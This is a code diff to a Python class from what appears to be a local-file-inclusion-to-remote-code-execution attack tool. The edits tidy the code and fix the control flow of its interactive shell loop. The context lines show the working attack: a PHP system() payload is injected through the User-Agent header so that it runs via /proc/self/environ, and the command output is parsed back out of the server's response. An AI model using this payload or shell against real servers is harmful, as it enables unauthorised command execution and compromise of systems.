@@ -96,7 +96,7 @@ class EnvironChecker:
                     if file_regex.search(response.text):
                         self.return_filepath = file_path
                         if not self.silent:
-                            self.console.print(f'\n[bold red]Possible LFI2RCE detected (proc_self_environ: method)[/bold red] (/proc/self/environ method)', style='bold red')
+                            self.console.print('\n[bold red]Possible LFI2RCE detected (proc_self_environ: method)[/bold red] (/proc/self/environ method)', style='bold red')
                         return True, param_name
                 
                 if progress:
@@ -128,11 +128,10 @@ class EnvironChecker:
                     elif "clear" in cmd:
                         if os.name == 'posix':
                             os.system('clear')
-                    elif os.name == 'nt':
-                        os.system('cls')                                                             
-                    if cmd.lower() in ["exit", "quit"]:
-                        break
-                    
+                        elif os.name == 'nt':
+                            os.system('cls')
+                        continue
+
                     cmd = f"<?php echo '['; echo 'S]'; system('{cmd}'); echo '[E]';?>"
                     headers = {'User-Agent': cmd}
                     
@@ -140,8 +139,9 @@ class EnvironChecker:
                         response = requests.post(fuzzed_url, headers=headers, verify=False)
                     except requests.exceptions.ConnectionError:
                         self.console.print("[bold red]Request Failed (WAF or down host)...[/bold red]")
+                        continue
 
-                    pattern = re.compile(r'\[S\](.*?)\[E\]', re.DOTALL) 
+                    pattern = re.compile(r'\[S\](.*?)\[E\]', re.DOTALL)
                     response_content = pattern.search(response.text)
                     if response_content and response_content.group(1):
                         shell_output = response_content.group(1)
